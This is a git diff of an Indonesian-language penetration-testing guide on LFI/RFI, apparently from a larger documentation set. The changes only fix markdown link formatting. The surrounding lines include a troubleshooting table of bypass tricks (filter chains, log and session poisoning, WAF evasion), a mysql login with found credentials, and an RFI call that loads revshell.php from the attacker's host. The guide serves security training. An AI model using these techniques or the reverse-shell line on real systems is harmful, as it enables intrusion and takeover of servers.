@@ -6541,7 +6541,7 @@ mysql -h $TARGET -u "$FOUND_USER" -p"$FOUND_PASS" -e "show databases;" 2>/dev/nu
 | `php://input` tidak bekerja | `allow_url_include = Off` | Gunakan filter chain atau log poisoning |
 | Filter chain 500 error | Payload terlalu panjang | Kirim via POST bukan GET |
 | RFI tidak ada request masuk | `allow_url_include = Off` atau firewall | Fokus ke LFI path lain (filter chain, log) |
-| Upload + LFI: extension diubah | MIME type check | Double extension, lihat `[25 — File Upload Workflow](/docs/file-upload)` |
+| Upload + LFI: extension diubah | MIME type check | Double extension, lihat [25 — File Upload Workflow](/docs/file-upload) |
 | Session poisoning gagal | Session path berbeda | `php.ini` untuk cek `session.save_path` |
 | Null byte bypass gagal | PHP > 5.3.4 | Teknik ini deprecated, gunakan wrapper/filter chain |
 | WAF memblokir payload | Input filtering | Coba encoding ganda, filter chain (tidak terlihat seperti LFI biasa) |
@@ -6654,6 +6654,6 @@ lfi "page=http://$LHOST:8080/revshell.php"
 
 ---
 
-> **➡️ NEXT:** Setelah LFI/RFI selesai dan dapat shell, lanjut ke **`[25 — File Upload Workflow](/docs/file-upload)`** untuk teknik upload bypass yang lebih advanced, atau jika ditemukan upload endpoint dari source disclosure di Fase 4.
+> **➡️ NEXT:** Setelah LFI/RFI selesai dan dapat shell, lanjut ke **[25 — File Upload Workflow](/docs/file-upload)** untuk teknik upload bypass yang lebih advanced, atau jika ditemukan upload endpoint dari source disclosure di Fase 4.
 
 → [File 25: File Upload](/docs/file-upload)
